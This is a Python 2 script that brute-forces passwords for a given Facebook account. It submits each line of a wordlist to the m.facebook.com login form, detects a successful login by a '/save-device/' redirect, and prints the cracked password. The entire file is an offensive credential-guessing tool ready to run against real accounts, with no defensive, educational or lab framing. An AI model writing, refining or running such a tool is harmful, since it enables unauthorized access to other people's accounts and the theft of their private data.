#!/usr/bin/env python2
import os
import sys
from browser import Browser
import argparse
from colorama import *


parser = argparse.ArgumentParser()
parser.add_argument('-u', metavar="user_id", type=str, nargs="?")
parser.add_argument('-p', metavar="pass_dir", type=str, nargs="?")
args = parser.parse_args()

url = "https://m.facebook.com"
browser = Browser()

def main(username, wordlist):
    if os.path.exists(wordlist):
        with open(str(wordlist), "r") as wordlist_file:
            list_of_password = wordlist_file.readlines()
            print("Start brute forcing")
            for password in list_of_password:
                try:
                    password = password.strip("\n")
                    response = browser.request_from(url, {'email': username, 'pass': password})
                    verificatiion = "/save-device/" in response
                    print(Fore.RED + "{0} => {1}: {2}".format(password, (verificatiion), response) + Fore.WHITE)
                    if verificatiion:
                        print(Fore.GREEN + "{0} => {1}".format(password, (verificatiion)) + Fore.WHITE)
                        break
                except KeyboardInterrupt:
                    print("Exit Programme !")
                    exit()
    else:
        print("Wordlist file don't find !")


if __name__ == "__main__":
    main(args.u, args.p)

